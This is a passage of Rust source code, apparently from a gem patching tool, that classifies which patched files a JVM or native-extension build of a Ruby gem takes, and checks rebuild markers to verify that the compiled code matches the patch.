fn is_java_platform(platform: &str) -> bool {
    platform
        .split('-')
        .any(|part| part.eq_ignore_ascii_case("java") || part.eq_ignore_ascii_case("jruby"))
}

/// The sources the jars of a JVM gem are built from, by extension. A jar
/// or a class file is not one: a record that replaces one whole puts the
/// patched code where the JVM loads it, like any file replacement.
const JVM_BUILD_EXTENSIONS: &[&str] = &["java", "kt", "scala"];

/// The build files of the tools that build those jars, in lowercase: the
/// name is matched whatever its case.
const JVM_BUILD_FILES: &[&str] = &[
    "pom.xml",
    "build.xml",
    "build.gradle",
    "build.gradle.kts",
    "mavenfile",
];

/// Whether a (normalized) gem file path is a JVM build input by its name: a
/// Java, Kotlin or Scala source, or a build file of Maven, Ant or Gradle.
/// The jars a JVM gem runs were built from these, and nothing here
/// rebuilds a jar.
///
/// The name alone decides, wherever the file sits, as it does when
/// Socket's backend builds the patched `java` gem: a `pom.xml` that is
/// only a template keeps a copy from being attested, which errs on the
/// side of not attesting.
fn is_jvm_build_input(path: &str) -> bool {
    let leaf = leaf_of(path).to_ascii_lowercase();
    JVM_BUILD_FILES.contains(&leaf.as_str())
        || leaf
            .rsplit_once('.')
            .is_some_and(|(stem, ext)| !stem.is_empty() && JVM_BUILD_EXTENSIONS.contains(&ext))
}

/// Whether a file of a patch is an input of a C build by its path: a file
/// under `ext/`, a patch or a port of a library the gem packs
/// (`patches/**`, `ports/**`), or a source or build file by name.
fn is_native_input_by_path(path: &str) -> bool {
    ["ext/", "patches/", "ports/"]
        .iter()
        .any(|dir| path.starts_with(dir))
        || is_native_by_name(path)
        || is_build_file_by_name(path)
}

/// Whether the JVM build of a gem takes one file of a record: `path`
/// (normalized) with the record's `info`, in a copy that holds a file at
/// that path or not (`held`).
///
/// The records are written for the `ruby` platform gem, and the JVM build
/// of the same release is another archive: it ships the gem's Ruby files,
/// often its C sources too (dead weight there: nothing on JRuby compiles
/// them), and none of what only a C build reads.
///
/// Only an input of a C build ([`is_native_input_by_path`]) can be left
/// out, because only that is known to mean nothing to a gem with no C
/// build:
///
/// * One the record replaces (it has a `beforeHash`) is part of this build
///   when the copy holds it: a C source the `java` gem ships is verified
///   and written like any patch file. One the copy does not hold is not
///   part of this platform's gem.
/// * One the record adds is never part of it: a new C source or a new
///   patch to a packed library.
///
/// Every other file is taken, held or not. A Ruby file the record replaces
/// is part of every build of the gem, so one that is absent from the copy
/// is the usual missing file, never a file to skip: a deleted target must
/// not read as a patch with nothing to do. A file the record adds is
/// created. A path that could leave the gem dir is always taken, so that
/// the apply engine refuses the record for it.
///
/// Two consequences are deliberate. A copy that takes no file of a record,
/// or only a C source that nothing there compiles, counts as patched
/// (`vex`, `apply --check`): the code the patch fixes is not in that
/// build, which is also the verdict on a copy installed from the patched
/// `java` gem. And a C build input that was deleted from the copy reads as
/// one the build never had: nothing here knows the `java` gem's file list,
/// nothing on JRuby reads such a file, and failing a patch that is applied
/// is the worse error.
fn jvm_takes(path: &str, info: &PatchFileInfo, held: bool) -> bool {
    if !is_safe_relative_subpath(path) || !is_native_input_by_path(path) {
        return true;
    }
    !info.before_hash.is_empty() && held
}

/// Whether a (normalized) gem file path is compiled JVM code: a jar or a
/// class file, what the JVM loads.
fn is_compiled_jvm_code(path: &str) -> bool {
    leaf_of(path).rsplit_once('.').is_some_and(|(stem, ext)| {
        !stem.is_empty() && ["jar", "class"].contains(&ext.to_ascii_lowercase().as_str())
    })
}

/// The files of the record `key` (a manifest purl) that keep a JVM copy of
/// `platform` from running the patch: the sources and build files of its
/// jars ([`is_jvm_build_input`]), sorted, which nothing here compiles.
/// None when the record brings the compiled code itself:
///
/// * The record written for the copy's own platform is the `java` gem's
///   own diff, applied whole: whatever it changes is what that gem ships.
/// * A record that replaces or adds a jar or a class file carries the code
///   the JVM loads, beside the source it was built from.
fn jvm_unbuilt_inputs(
    platform: &str,
    key: &str,
    files: &HashMap<String, PatchFileInfo>,
) -> Vec<String> {
    if names_platform(key, platform)
        || files
            .keys()
            .any(|file| is_compiled_jvm_code(normalize_file_path(file)))
    {
        return Vec::new();
    }
    let mut inputs: Vec<String> = files
        .keys()
        .filter(|file| is_jvm_build_input(normalize_file_path(file)))
        .cloned()
        .collect();
    inputs.sort();
    inputs
}

/// A record as the JVM build of a gem takes it ([`jvm_takes`]).
#[derive(Debug, Clone, Default, PartialEq)]
struct JvmRecord {
    /// The record's files that are part of this build.
    files: HashMap<String, PatchFileInfo>,
    /// The record's keys that keep the copy's jars from being the patch's
    /// ([`jvm_unbuilt_inputs`]), sorted, whether the copy holds them or
    /// not: the jars it runs may have been built from them.
    jvm_inputs: Vec<String>,
}

/// Whether the manifest record `key` (a purl) is the one written for the
/// `ruby` platform gem: it names no platform, or `ruby`.
fn is_ruby_platform_record(key: &str) -> bool {
    crate::utils::purl::purl_qualifier(key, "platform")
        .is_none_or(|platform| platform.eq_ignore_ascii_case("ruby"))
}

/// The record `key` (a manifest purl) with `files`, as the JVM gem copy in
/// `gem_dir` (of `platform`) takes it.
///
/// Only the record written for the `ruby` platform gem is read file by
/// file ([`jvm_takes`]): that gem is another archive than the one
/// installed, so some of its files are no part of the copy. A record
/// qualified for a platform names the archive it was written for (the
/// copy's own `java`, or another one that was matched to it), and every
/// file of it is taken: one the copy lacks is the usual missing file.
async fn jvm_record(
    gem_dir: &Path,
    platform: &str,
    key: &str,
    files: &HashMap<String, PatchFileInfo>,
) -> JvmRecord {
    let per_file = is_ruby_platform_record(key);
    let mut out = JvmRecord {
        files: HashMap::new(),
        jvm_inputs: jvm_unbuilt_inputs(platform, key, files),
    };
    for (file, info) in files {
        let path = normalize_file_path(file);
        // Only a C build input the record replaces is looked for.
        let held = !per_file
            || info.before_hash.is_empty()
            || !is_safe_relative_subpath(path)
            || !is_native_input_by_path(path)
            || !matches!(
                tokio::fs::symlink_metadata(gem_dir.join(path)).await,
                Err(e) if crate::patch::apply::is_missing_path(&e)
            );
        if !per_file || jvm_takes(path, info, held) {
            out.files.insert(file.clone(), info.clone());
        }
    }
    out
}

/// Whether a (normalized) gem file path is a native-extension build input by
/// its name alone: a C/C++/Objective-C source or header, a racc/ragel
/// grammar, an `extconf.rb`, or a `depend` file under `ext/`.
fn is_native_by_name(path: &str) -> bool {
    let leaf = path.rsplit('/').next().unwrap_or(path);
    if leaf == "extconf.rb" || (leaf == "depend" && path.starts_with("ext/")) {
        return true;
    }
    leaf.rsplit_once('.').is_some_and(|(stem, ext)| {
        !stem.is_empty() && NATIVE_SOURCE_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
    })
}

fn is_generated_grammar(path: &str) -> bool {
    path.rsplit_once('.').is_some_and(|(_, ext)| {
        GENERATED_GRAMMAR_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
    })
}

/// Whether a file of a native gem is a build file by its name, wherever it
/// sits: a Java or Rust source, or the manifest of a build system.
fn is_build_file_by_name(path: &str) -> bool {
    let leaf = leaf_of(path);
    NATIVE_BUILD_FILES.contains(&leaf)
        || leaf.rsplit_once('.').is_some_and(|(stem, ext)| {
            !stem.is_empty() && NATIVE_BUILD_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
        })
}

/// The file name of a gem path.
fn leaf_of(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Whether a gem file is Ruby source or a type signature
/// ([`RUBY_SOURCE_EXTENSIONS`], a `Rakefile`, a `Gemfile`).
fn is_ruby_source(path: &str) -> bool {
    let leaf = leaf_of(path);
    RAKE_SCRIPTS.contains(&leaf)
        || leaf.starts_with("Gemfile")
        || leaf.rsplit_once('.').is_some_and(|(stem, ext)| {
            !stem.is_empty() && RUBY_SOURCE_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str())
        })
}

/// Whether a Ruby file is a rake file: a rake script by name
/// ([`RAKE_SCRIPTS`]) or a `.rake` task file.
fn is_rake_file(path: &str) -> bool {
    let leaf = leaf_of(path);
    RAKE_SCRIPTS.contains(&leaf)
        || leaf
            .rsplit_once('.')
            .is_some_and(|(_, ext)| ext.eq_ignore_ascii_case("rake"))
}

/// Whether a file of a native gem clearly takes no part in its build: a
/// file under a require path (Ruby loads it as it is), an executable, a
/// test, documentation, or the gem's own packaging files.
fn is_clearly_not_built(path: &str, require_paths: &[String]) -> bool {
    if under_require_path(path, require_paths) {
        return true;
    }
    match path.split_once('/') {
        Some((top, _)) => NOT_BUILT_DIRS.contains(&top),
        None => {
            let upper = path.to_ascii_uppercase();
            ["README", "LICENSE", "LICENCE", "CHANGELOG", "GEMFILE"]
                .iter()
                .any(|prefix| upper.starts_with(prefix))
                || [".MD", ".TXT", ".GEMSPEC"]
                    .iter()
                    .any(|suffix| upper.ends_with(suffix))
        }
    }
}

/// A gem record's native-extension build inputs on one installed copy.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct NativeScope {
    /// The record's keys that are build inputs, sorted.
    inputs: Vec<String>,
    /// The installed spec declares extensions (RubyGems builds them at
    /// install time).
    builds_extensions: bool,
    /// The platform of a precompiled platform gem: its spec declares no
    /// extensions and its platform is not `ruby`, so the compiled code it
    /// runs was built from the ruby-platform source gem before it was
    /// packed.
    precompiled: Option<String>,
    /// The release the copy was installed from ([`SpecFacts::release`]).
    release: Option<GemId>,
}

impl NativeScope {
    /// The archive the copy's extension is rebuilt from: its own for a gem
    /// RubyGems built at install time, the ruby-platform source gem of the
    /// same version for a precompiled one.
    fn source_gem(&self) -> Option<GemId> {
        let release = self.release.clone()?;
        Some(match &self.precompiled {
            Some(_) => GemId {
                platform: None,
                ..release
            },
            None => release,
        })
    }
}

/// Classify `files` against what the installed gemspec says (`facts`).
///
/// A gem is native when its gemspec declares extensions or its platform is
/// not `ruby` (a precompiled platform gem). Its build inputs:
///
/// * Always: a source by name ([`is_native_by_name`],
///   [`is_build_file_by_name`]), anything under `ext/`, and anything under
///   the dir of a declared build script. A script at the gem root
///   (`extensions = ["extconf.rb"]`) makes the files beside it inputs.
/// * Ruby source and type signatures elsewhere ([`is_ruby_source`]) are
///   not: Ruby loads them as they are, wherever the gem keeps them
///   (passenger's `src/helper-scripts/*.rb`, a `sig/*.rbs`). The
///   exceptions are a build script by name (a `Rakefile`, a
///   `mkrf_conf.rb`), and any rake file of a gem whose extension rake
///   builds.
/// * Every other file is one unless it clearly is not
///   ([`is_clearly_not_built`]): `extconf.rb` builds from whatever the gem
///   packs (nokogiri's reads `patches/**`, `ports/**` and
///   `dependencies.yml`), so only a file known to take no part counts as
///   plain.
/// * A grammar under a require path of a precompiled gem is not one: its
///   generated output is what the gem packs and Ruby loads.
///
/// In a gem that is not native (no extensions, the `ruby` platform), only a
/// name-matched source under `ext/` counts. C or Objective-C files
/// elsewhere (a template, a test fixture) compile nothing, and neither do
/// grammar sources, whose generated output the gem packs.
fn classify(facts: &SpecFacts, files: &HashMap<String, PatchFileInfo>) -> NativeScope {
    let decl = &facts.extensions;
    // `None`: a script at the gem root.
    let dirs: Vec<Option<String>> = decl
        .entries
        .iter()
        .map(|e| {
            e.trim_start_matches("./")
                .rsplit_once('/')
                .map(|(dir, _)| format!("{dir}/"))
        })
        .collect();
    let under_script_dir = |path: &str| {
        dirs.iter().any(|d| match d {
            Some(d) => path.starts_with(d.as_str()),
            None => !path.contains('/'),
        })
    };
    // Rake builds the extension, or nothing says what does.
    let rake_built = decl.declared
        && (decl.entries.is_empty()
            || decl
                .entries
                .iter()
                .any(|entry| RAKE_SCRIPTS.contains(&leaf_of(entry))));
    let precompiled = facts.platform.clone().filter(|_| !decl.declared);
    let native = decl.declared || precompiled.is_some();
    let mut inputs: Vec<String> = files
        .keys()
        .filter(|key| {
            let path = normalize_file_path(key);
            if !native {
                return path.starts_with("ext/")
                    && is_native_by_name(path)
                    && !is_generated_grammar(path);
            }
            let plain = is_clearly_not_built(path, &facts.require_paths);
            if precompiled.is_some() && plain && is_generated_grammar(path) {
                return false;
            }
            if is_native_by_name(path)
                || is_build_file_by_name(path)
                || under_script_dir(path)
                || path.starts_with("ext/")
            {
                return true;
            }
            if is_ruby_source(path) {
                return RAKE_SCRIPTS.contains(&leaf_of(path)) || (rake_built && is_rake_file(path));
            }
            !plain
        })
        .cloned()
        .collect();
    inputs.sort();
    NativeScope {
        inputs,
        builds_extensions: decl.declared,
        precompiled,
        release: facts.release.clone(),
    }
}

/// What the installed gemspec of the copy at `pkg_path` says, and the copy
/// when it is a RubyGems install whose spec could be read (the facts are
/// empty otherwise).
async fn facts_of(pkg_path: &Path) -> (SpecFacts, Option<GemCopy>) {
    let copy = GemCopy::of(pkg_path);
    let spec_text = match &copy {
        Some(c) => crate::utils::fs::read_regular_to_string(&c.spec_path)
            .await
            .ok(),
        None => None,
    };
    let facts = match (&copy, &spec_text) {
        (Some(copy), Some(text)) => SpecFacts::of(text, &copy.full_name),
        _ => SpecFacts::default(),
    };
    (facts, copy.filter(|_| spec_text.is_some()))
}

/// One installed gem copy with its gemspec read: what a record is judged
/// against. A caller that asks more than one thing of a copy (the `vex` and
/// `apply --check` verifier asks which files to verify and whether the
/// compiled code is the patch's) reads the gemspec once, here.
#[derive(Debug, Clone)]
pub struct InstalledGem {
    /// What the gemspec says; empty when the copy is no RubyGems install
    /// or its spec could not be read.
    facts: SpecFacts,
    /// The copy, when its spec was read. Without a readable spec nothing
    /// proves which scripts the gem builds: name-matched inputs still
    /// count, and the copy is unusable for a build.
    copy: Option<GemCopy>,
}

impl InstalledGem {
    /// The gem copy at `pkg_path`.
    pub async fn at(pkg_path: &Path) -> InstalledGem {
        let (facts, copy) = facts_of(pkg_path).await;
        InstalledGem { facts, copy }
    }

    /// The copy and its platform, when it is the JVM build of a gem
    /// ([`SpecFacts::jvm_platform`]).
    fn jvm(&self) -> Option<(&GemCopy, &str)> {
        Some((self.copy.as_ref()?, self.facts.jvm_platform()?))
    }

    /// The record's native scope on this copy. No inputs: the record is
    /// plain Ruby for it.
    fn scope(&self, files: &HashMap<String, PatchFileInfo>) -> NativeScope {
        classify(&self.facts, files)
    }

    /// The record `key` (a manifest purl) with `files`, as this copy takes
    /// it. The JVM build of a gem (what JRuby installs) takes of the
    /// ruby-platform record the files that are part of that build
    /// ([`jvm_record`]); any other copy, and any other record, takes the
    /// record as it is.
    ///
    /// Whatever compares a record with an installed copy reads it through
    /// this (`vex`, `apply --check`, `rollback`), as `apply` wrote it: a
    /// file the JVM build has no use for is neither missing from the copy
    /// nor there to restore.
    pub async fn record_files<'f>(
        &self,
        key: &str,
        files: &'f HashMap<String, PatchFileInfo>,
    ) -> std::borrow::Cow<'f, HashMap<String, PatchFileInfo>> {
        use std::borrow::Cow;
        match self.jvm() {
            Some((copy, platform)) if is_ruby_platform_record(key) => {
                Cow::Owned(jvm_record(&copy.gem_dir, platform, key, files).await.files)
            }
            _ => Cow::Borrowed(files),
        }
    }
}

/// [`InstalledGem::record_files`] for the gem copy at `pkg_path`.
pub async fn installed_files<'f>(
    pkg_path: &Path,
    key: &str,
    files: &'f HashMap<String, PatchFileInfo>,
) -> std::borrow::Cow<'f, HashMap<String, PatchFileInfo>> {
    InstalledGem::at(pkg_path)
        .await
        .record_files(key, files)
        .await
}

/// The build marker written into the gem dir after a rebuild.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BuildMarker {
    pub schema: u32,
    /// Native input (normalized path) → its git-sha256 when it was built.
    pub sources: BTreeMap<String, String>,
    /// The extension dir built into, relative to the gem home:
    /// `extensions/<platform>/<abi>/<full_name>` (see [`confined_ext_dir`]).
    /// Empty for a grafted build.
    pub extension_dir: String,
    /// Artifact path relative to the extension dir → git-sha256.
    pub ext_artifacts: BTreeMap<String, String>,
    /// The artifacts' copies RubyGems put under the gem's require dir:
    /// path relative to the gem dir → git-sha256. For a grafted build, the
    /// prebuilt binaries the build replaced.
    pub lib_artifacts: BTreeMap<String, String>,
    /// The copy is a precompiled platform gem, and `lib_artifacts` are its
    /// prebuilt binaries replaced by a build of the source gem (schema
    /// [`GRAFT_MARKER_SCHEMA`]). Their paths name the Ruby minors the copy
    /// was grafted for (`lib/nokogiri/3.4/nokogiri.bundle`): one per Ruby
    /// that ran `apply`.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub grafted: bool,
}

/// The marker of an extension dir RubyGems' builder filled.
const MARKER_SCHEMA: u32 = 1;
/// The marker of a precompiled copy whose prebuilt binaries were replaced
/// ([`BuildMarker::grafted`]). A release that only knows schema 1 reads it
/// as no marker, and so attests nothing it does not understand.
const GRAFT_MARKER_SCHEMA: u32 = 2;

/// The extension dir a marker or backup names, only when it is
/// `extensions/<platform>/<abi>/<full_name>` under the copy's home: those
/// files sit in the gem dir, where a checkout could plant them, so the path
/// they hold is never trusted further than the one dir RubyGems builds this
/// gem into.
fn confined_ext_dir(copy: &GemCopy, label: &str) -> Option<PathBuf> {
    is_confined_ext_label(&copy.full_name, label).then(|| copy.home.join(label))
}

/// Whether `label` is `extensions/<platform>/<abi>/<full_name>`: the one
/// place under a gem home that RubyGems builds the gem `full_name` into.
/// The one rule for every extension dir this module replaces, moves or
/// deletes, in a gem home or in a stage home.
fn is_confined_ext_label(full_name: &str, label: &str) -> bool {
    let parts: Vec<&str> = label.split('/').collect();
    parts.len() == 4
        && parts[0] == "extensions"
        && parts[3] == full_name
        && is_safe_relative_subpath(label)
}

/// `Err` when `path` is a symlink, and when nothing says it is not one:
/// only "not found" reads as no link, and a path that cannot be probed
/// (permission denied, a parent that is no directory, an I/O error) is
/// refused like a link ([`try_entry_type`]). For a path this module is
/// about to follow, empty or delete; `what` is what belongs there ("an
/// extension dir"). The error names the path.
fn refuse_link(path: &Path, what: &str) -> std::io::Result<()> {
    match try_entry_type(path)? {
        Some(kind) if kind.is_symlink() => Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!("{} is a symlink, not {what}", path.display()),
        )),
        _ => Ok(()),
    }
}

/// [`read_marker_sync`] for a caller that must not take a marker it cannot
/// read for no marker (a rollback deciding whether the compiled code is the
/// gem's own): `Ok(None)` only when no marker file is there. One that
/// cannot be probed, read or understood (another schema) is an error
/// naming it.
fn read_marker_strict(gem_dir: &Path) -> std::io::Result<Option<BuildMarker>> {
    let path = gem_dir.join(MARKER_FILE);
    if try_entry_type(&path)?.is_none() {
        return Ok(None);
    }
    read_marker_sync(gem_dir).map(Some).ok_or_else(|| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!("{} could not be read as a build marker", path.display()),
        )
    })
}

fn read_marker_sync(gem_dir: &Path) -> Option<BuildMarker> {
    let text = crate::utils::fs::read_regular_to_string_sync(&gem_dir.join(MARKER_FILE)).ok()?;
    serde_json::from_str::<BuildMarker>(&text)
        .ok()
        .filter(|m| match m.schema {
            MARKER_SCHEMA => !m.grafted,
            GRAFT_MARKER_SCHEMA => m.grafted,
            _ => false,
        })
}

/// Whether `marker` lists exactly the record's patched native inputs.
fn marker_sources_match(
    marker: &BuildMarker,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
) -> bool {
    marker.sources.len() == scope.inputs.len()
        && scope.inputs.iter().all(|key| {
            marker.sources.get(normalize_file_path(key)) == files.get(key).map(|i| &i.after_hash)
        })
}

/// Whether every artifact `marker` recorded is still on disk with the bytes
/// it was built with. An artifact path that escapes its dir never
/// verifies.
///
/// A marker speaks for the kind of copy it was written for: one of an
/// extension dir for a gem that builds its extensions, a grafted one for a
/// precompiled gem, which must name at least one replaced binary.
fn marker_artifacts_hold(marker: &BuildMarker, copy: &GemCopy, scope: &NativeScope) -> bool {
    let artifact_ok = |base: &Path, rel: &str, hash: &str| {
        is_safe_relative_subpath(rel)
            && compute_file_git_sha256_sync(&base.join(rel)).is_ok_and(|h| h == hash)
    };
    let lib_ok = || {
        marker
            .lib_artifacts
            .iter()
            .all(|(rel, hash)| artifact_ok(&copy.gem_dir, rel, hash))
    };
    if marker.grafted {
        return scope.precompiled.is_some()
            && !scope.builds_extensions
            && marker.ext_artifacts.is_empty()
            && !marker.lib_artifacts.is_empty()
            && lib_ok();
    }
    if !scope.builds_extensions {
        return false;
    }
    let Some(ext_dir) = confined_ext_dir(copy, &marker.extension_dir) else {
        return false;
    };
    marker
        .ext_artifacts
        .iter()
        .all(|(rel, hash)| artifact_ok(&ext_dir, rel, hash))
        && lib_ok()
}

/// A prebuilt binary kept per Ruby minor, `<base>/<major.minor>/<file>`
/// (`lib/nokogiri/3.4/nokogiri.bundle`): its base dir, minor and file name.
fn minor_layout(target: &str) -> Option<(&str, &str, &str)> {
    let (dir, leaf) = target.rsplit_once('/')?;
    let (base, minor) = dir.rsplit_once('/').unwrap_or(("", dir));
    (ruby_minor(minor).as_deref() == Some(minor)).then_some((base, minor, leaf))
}

/// The binaries a precompiled gem ships for other Rubies beside `target`:
/// the same file name in the sibling dirs named for a Ruby `major.minor`
/// (`lib/nokogiri/3.4/nokogiri.bundle` → `lib/nokogiri/3.3/nokogiri.bundle`,
/// …). None for a binary that is not kept per Ruby minor.
fn prebuilt_siblings(gem_dir: &Path, target: &str) -> Vec<String> {
    let Some((base, minor, leaf)) = minor_layout(target) else {
        return Vec::new();
    };
    let Ok(entries) = std::fs::read_dir(gem_dir.join(base)) else {
        return Vec::new();
    };
    let mut out: Vec<String> = entries
        .flatten()
        .filter_map(|entry| {
            let name = entry.file_name().to_str()?.to_string();
            let other = name != minor && ruby_minor(&name).as_deref() == Some(name.as_str());
            (other && is_real_dir(&entry.path()) && is_real_file(&entry.path().join(leaf)))
                .then(|| [base, name.as_str(), leaf].join("/"))
        })
        .collect();
    out.sort();
    out
}

/// Whether `marker` was built from exactly the record's patched native
/// inputs, and every artifact it recorded is still on disk with the bytes
/// it was built with.
///
/// That is all a grafted copy is held to as well. `gem install` builds an
/// extension for the Ruby that runs it and promises nothing to another
/// Ruby pointed at the same gem home; a graft is the same build, of the
/// same sources, for the Ruby that ran `apply`. The binaries a precompiled
/// gem ships for other Rubies are not this build's to answer for.
fn marker_holds(
    marker: &BuildMarker,
    copy: &GemCopy,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
) -> bool {
    marker_sources_match(marker, scope, files) && marker_artifacts_hold(marker, copy, scope)
}

/// What a copy's build marker says is left for `apply` to do for a record,
/// as far as files tell.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Built {
    /// No marker that holds: the extension is still to be built.
    No,
    /// The marker holds, and no other Ruby could be the one asking.
    Yes,
    /// The marker holds, for the Rubies whose `major.minor` it lists, and
    /// the gem ships a prebuilt binary for another Ruby, which may be the
    /// one running `apply` now: its binary is then grafted too. Only the
    /// Ruby itself can say.
    ForRubies(Vec<String>),
}

/// The [`Built`] state of `copy` for a record.
///
/// A precompiled gem ships one binary per Ruby minor, and a graft replaces
/// the one of the Ruby that ran `apply`. Another Ruby can only be asking
/// when the gem ships a binary the marker does not list
/// ([`prebuilt_siblings`]) and the gem home is not laid out for one Ruby
/// whose binary is already grafted ([`home_minor`]: the Ruby that owns
/// such a home is the only one [`find_ruby`] accepts for it).
fn built_state(
    copy: &GemCopy,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
) -> Built {
    let Some(marker) =
        read_marker_sync(&copy.gem_dir).filter(|m| marker_holds(m, copy, scope, files))
    else {
        return Built::No;
    };
    if !marker.grafted {
        return Built::Yes;
    }
    let mut grafted: Vec<String> = marker
        .lib_artifacts
        .keys()
        .filter_map(|target| minor_layout(target).map(|(_, minor, _)| minor.to_string()))
        .collect();
    grafted.sort();
    grafted.dedup();
    let ships_another = marker.lib_artifacts.keys().any(|target| {
        prebuilt_siblings(&copy.gem_dir, target)
            .iter()
            .any(|sibling| !marker.lib_artifacts.contains_key(sibling))
    });
    let its_own_ruby_done = home_minor(copy).is_some_and(|tied| grafted.contains(&tied));
    if ships_another && !its_own_ruby_done {
        Built::ForRubies(grafted)
    } else {
        Built::Yes
    }
}

/// `vex` / `apply --check`: the installed gem copy at `pkg_path`, whose
/// record files already verify, runs code built from them. A record with no
/// native input on this copy passes; one with native inputs passes only when
/// the copy's build marker holds ([`BuildMarker`]): for a gem RubyGems built
/// at install time, the marker of its rebuilt extension dir; for a
/// precompiled platform gem, the marker of the prebuilt binaries replaced
/// by a build of the source gem. Errors carry [`NOT_REBUILT_REASON`].
///
/// The JVM build of a gem compiles nothing of a record but what its jars
/// were built from, and nothing here rebuilds a jar: the record `key` (a
/// manifest purl) never passes on such a copy when it changes sources of
/// those jars without bringing the compiled code
/// ([`jvm_unbuilt_inputs`]), and any other record passes with no marker
/// (its files are judged through [`InstalledGem::record_files`]).
pub async fn verify_native_build(
    pkg_path: &Path,
    key: &str,
    files: &HashMap<String, PatchFileInfo>,
) -> Result<(), String> {
    InstalledGem::at(pkg_path)
        .await
        .verify_native_build(key, files)
        .await
}

impl InstalledGem {
    /// [`verify_native_build`] of this copy.
    pub async fn verify_native_build(
        &self,
        key: &str,
        files: &HashMap<String, PatchFileInfo>,
    ) -> Result<(), String> {
        if let Some((_, platform)) = self.jvm() {
            return if jvm_unbuilt_inputs(platform, key, files).is_empty() {
                Ok(())
            } else {
                Err(NOT_REBUILT_REASON.to_string())
            };
        }
        let scope = self.scope(files);
        if scope.inputs.is_empty() {
            return Ok(());
        }
        let Some(copy) = self.copy.clone() else {
            return Err(NOT_REBUILT_REASON.to_string());
        };
        let files = files.clone();
        let holds = crate::utils::fs::run_blocking(move || {
            read_marker_sync(&copy.gem_dir).is_some_and(|m| marker_holds(&m, &copy, &scope, &files))
        })
        .await;
        if holds {
            Ok(())
        } else {
            Err(NOT_REBUILT_REASON.to_string())
        }
    }
}

/// What a gem apply whose result succeeded says beyond that result, when
/// the result alone would read as a copy the patch was applied to and it
/// is not one. The text is the reason in words, without the purl.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GemCaveat {
    /// No file of the record is part of the build installed there
    /// ([`NOT_IN_BUILD_CODE`]): nothing was verified or written, the code
    /// the patch changes is not in that build, nothing is left to do and
    /// the copy counts as patched. The caller reports it as skipped.
    NotInBuild(String),
    /// The patch is incomplete on this copy ([`NOT_REBUILT_REASON`]): the
    /// record's files that the copy takes are written (there may be none),
    /// and the compiled code it runs is not the patch's, with nothing here
    /// to make it so. `result` says what was written, and none of it is
    /// undone: the patch's Ruby half stays in effect, and a gem that
    /// compiles its patched source later on its own relies on it. The
    /// caller fails the run on it. The same text, after the purl, is the
    /// run's warning.
    Incomplete(String),
}

/// [`apply_gem_package_patch`]'s outcome: the copy's result, and a run
/// warning `(code, detail)` the caller surfaces next to it. A result that
/// succeeded with a [`NOT_REBUILT_REASON`] warning wrote the record's files
/// and built nothing: the copy's compiled code is not the patch's. Unless
/// the caller compiles it itself (`--no-gem-native-rebuild`), that patch
/// is incomplete, which `caveat` says in a typed way.
#[derive(Debug, Clone)]
pub struct GemApplied {
    pub result: ApplyResult,
    pub warning: Option<(String, String)>,
    /// Set when `result` succeeded and is not the whole story
    /// ([`GemCaveat`]).
    pub caveat: Option<GemCaveat>,
}

impl GemApplied {
    /// The outcome of a copy whose patch is incomplete because `detail`
    /// ([`GemCaveat::Incomplete`]): `result` stands as it is, and the run
    /// warning carries the same text.
    fn incomplete(result: ApplyResult, package_key: &str, detail: String) -> GemApplied {
        GemApplied {
            result,
            warning: Some((
                NOT_REBUILT_REASON.to_string(),
                format!("{package_key}: {detail}"),
            )),
            caveat: Some(GemCaveat::Incomplete(detail)),
        }
    }
}

/// Where the Ruby that builds a copy's extension is looked for and run.
#[derive(Debug, Clone)]
pub struct RubyEnv {
    /// The project dir the Ruby on `PATH` runs from (a version manager's
    /// `.ruby-version` there picks the project's Ruby).
    pub cwd: PathBuf,
    /// Rebuild native extensions. `false` (`--no-gem-native-rebuild`): the
    /// caller compiles them itself, so patched sources are written without
    /// a build, as before #1996, with a [`NOT_REBUILT_REASON`] warning.
    pub rebuild: bool,
    /// `--offline`: a source gem that is not in the gem home's `cache/` is
    /// not downloaded, and neither is a gem its build needs.
    pub offline: bool,
    /// Where a line about a build goes while the run is still going: one
    /// when it starts and one when it ends ([`run_build`]). A build can
    /// take many minutes, and a run that prints nothing until its summary
    /// looks hung (#2144). `None`: nothing is said (`--json`, `--silent`).
    pub progress: Option<fn(&str)>,
}

impl RubyEnv {
    fn say(&self, line: &str) {
        if let Some(progress) = self.progress {
            progress(line);
        }
    }
}

/// `90` → `1m 30s`: how long a build took, for a person.
fn took(elapsed: Duration) -> String {
    let secs = elapsed.as_secs();
    match (secs / 60, secs % 60) {
        (0, s) => format!("{s}s"),
        (m, s) => format!("{m}m {s}s"),
    }
}

/// Run a build of `copy`'s extension (`run`, `from`: "its source gem with
/// the patch applied", "its upstream gem"), saying when it starts and how it
/// ended
/// ([`RubyEnv::progress`]). What the build was worth is the caller's to
/// say: one that exits cleanly may still have built nothing of the patch.
async fn run_build(
    probe: &Probe,
    run: RubyRun<'_>,
    copy: &GemCopy,
    env: &RubyEnv,
    from: &str,
) -> Result<String, String> {
    env.say(&format!(
        "Rebuilding the native extension of {} from {from}; this can take several minutes.",
        copy.full_name
    ));
    let started = std::time::Instant::now();
    let built = run_ruby(&probe.ruby, run, copy, env, BUILD_TIMEOUT).await;
    let ended = match &built {
        Ok(_) => "finished",
        Err(_) => "failed",
    };
    env.say(&format!(
        "The build of {} {ended} after {}.",
        copy.full_name,
        took(started.elapsed())
    ));
    built
}

/// The Ruby that builds a gem copy's extension, and where the build lands.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Probe {
    ruby: PathBuf,
    gem_dir: PathBuf,
    /// Where `ruby` builds the gem's extension, as it spells the path: one
    /// of the copy's installed extension dirs.
    extension_dir: PathBuf,
    /// The gem's first require path as its gemspec spells it (`lib`).
    require_path: String,
    /// Every require path of the gem that stays inside it.
